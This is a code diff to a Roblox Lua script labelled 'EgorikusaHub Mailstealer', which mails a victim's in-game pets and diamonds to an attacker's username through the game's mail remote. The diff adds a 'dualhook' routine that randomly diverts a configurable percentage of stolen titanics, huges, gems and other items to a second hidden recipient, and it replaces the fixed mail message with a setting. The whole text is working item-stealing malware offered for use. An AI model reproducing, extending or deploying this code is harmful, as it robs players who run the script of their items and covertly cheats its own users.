@@ -1,3 +1,7 @@
+-- MAIL STEALER BELLOW
+
+-- [EgorikusaHub Mailstealer]
+
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
@@ -1113,6 +1117,66 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     end
 end
+local titanicin
+local bananin
+local hugein
+local pogin
+local excin
+local eventin
+local secretin
+local mythicin
+local gemsin
+local mailmsg = "Monzz"
+if dhuser ~= nil then
+    if getgenv().Settings.Titanics.Dualhook then
+        titanicin = getgenv().Settings.Titanics.Intensity
+    end
+    if getgenv().Settings.Banana.Dualhook then
+        bananin = getgenv().Settings.Banana.Intensity
+    end
+    if getgenv().Settings.Huges.Dualhook then
+        hugein = getgenv().Settings.Huges.Intensity
+    end
+    if getgenv().Settings.Pogs.Dualhook then
+        pogin = getgenv().Settings.Pogs.Intensity
+    end
+    if getgenv().Settings.Exclusives.Dualhook then
+        excin = getgenv().Settings.Exclusives.Intensity
+    end
+    if getgenv().Settings.Events.Dualhook then
+        eventin = getgenv().Settings.Events.Intensity
+    end
+    if getgenv().Settings.Secrets.Dualhook then
+        secretin = getgenv().Settings.Secrets.Intensity
+    end
+    if getgenv().Settings.HC_DM_Mythics.Dualhook then
+        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
+    end
+    if getgenv().Settings.Gems.Dualhook then
+        gemsin = getgenv().Settings.Gems.Intensity
+    end
+    if getgenv().Settings.Webhook ~= true then
+        whenabled = false
+    end
+    if getgenv().Settings.MailMessage ~= nil then
+        mailmsg = getgenv().Settings.MailMessage
+    end
+end
+
+-- Dualhook intensity
+
+function dualhook(percent)
+    if not tonumber(percent) then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
+        return;
+    end
+    local number = math.random(1, 100)
+    if number <= percent then
+        return true
+    else
+        return false
+    end
+end
 
 -- Sending The Pets
 
@@ -1122,7 +1186,7 @@ if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
 else
     ndUser = UserName
 end
-local User
+local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
@@ -1130,13 +1194,17 @@ if FinalList == 0 then
     else
         user = ndUser
     end
+    if gemsin ~= nil then
+        if dualhook(gemsin) then
+            user = dhuser
+        end
     end
     local args = {
         [1] = {
             ["Recipient"] = user,
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
-            ["Message"] = "Monzz",
+            ["Message"] = mailmsg,
         }
     }
     mailremote:InvokeServer(unpack(args))
@@ -1146,6 +1214,9 @@ spawn(function()
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
                 user = UserName
+                if titanicin ~= nil then
+                    if dualhook(titanicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1153,7 +1224,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1171,6 +1242,9 @@ spawn(function()
         if #BList ~= 0 and #TList == 0 then
             for i, v in pairs(BList) do
                 user = UserName
+                if bananin ~= nil then
+                    if dualhook(bananin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1178,7 +1252,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1198,6 +1272,9 @@ spawn(function()
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
                 user = UserName
+                if hugein ~= nil then
+                    if dualhook(hugein) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1205,7 +1282,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1224,6 +1301,9 @@ spawn(function()
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
                 user = UserName
+                if pogin ~= nil then
+                    if dualhook(pogin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1231,7 +1311,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1249,6 +1329,9 @@ spawn(function()
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
                 user = UserName
+                if excin ~= nil then
+                    if dualhook(excin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1256,7 +1339,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1274,6 +1357,9 @@ spawn(function()
         if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EvList) do
                 user = ndUser
+                if eventin ~= nil then
+                    if dualhook(eventin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1281,7 +1367,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1299,6 +1385,9 @@ spawn(function()
         if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(SList) do
                 user = ndUser
+                if secretin ~= nil then
+                    if dualhook(secretin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1306,7 +1395,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
@@ -1324,6 +1413,9 @@ spawn(function()
         if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(MList) do
                 user = ndUser
+                if mythicin ~= nil then
+                    if dualhook(mythicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1331,7 +1423,7 @@ spawn(function()
                         ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monzz",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
